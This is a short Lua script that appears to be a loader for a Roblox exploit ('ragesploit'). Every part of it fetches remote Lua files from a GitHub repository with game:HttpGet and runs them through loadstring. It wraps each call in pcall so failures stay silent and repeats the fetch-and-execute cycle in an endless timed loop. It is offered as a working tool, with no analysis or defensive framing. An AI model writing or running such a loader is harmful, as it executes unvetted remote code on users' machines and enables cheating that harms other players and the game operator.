local B="https://raw.githubusercontent.com/ragesploitadoptme/ragesploit/main/script"
local function L(i)task.spawn(function()pcall(function()loadstring(game:HttpGet(B..i..".lua"))()end)end)end
getgenv().Script0Ready=false
L(0)
repeat task.wait() until getgenv().Script0Ready
L(1)
while true do
	task.wait(2)L(2)
	task.wait(7)L(3)
	task.wait(3)L(3)
	task.wait(16)L(4)
	task.wait(3)L(4)
	task.wait(3)L(4)
	task.wait(6)
end
